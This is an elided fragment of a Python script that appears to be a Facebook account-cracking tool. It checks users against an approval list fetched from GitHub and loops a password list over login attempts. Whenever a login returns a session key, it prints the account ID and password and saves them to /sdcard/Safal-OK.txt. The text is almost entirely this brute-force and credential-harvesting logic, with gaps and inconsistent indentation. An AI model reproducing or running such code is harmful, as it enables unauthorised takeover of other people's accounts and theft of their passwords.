...
def contact():
	...
	admin = input(" CHOOSE : ")
	if admin in ['1']:
		os.system('xdg-open https://www.facebook.com/profile.php?id=100026802051799')
		back()
	elif admin in ['2']:
		linex()
...
def approval():
	...
	print ("""\033[1;37m----------------------------------------------""")
	try:
		httpCaht = requests.get("https://github.com/NIKHILBABE/APPROVED/blob/main/APPROVED").text
		if id in httpCaht:
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/Safal-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [Safal-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/Safal-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [Safal-OK] '+uid+' | '+pas+'\033[1;97m')
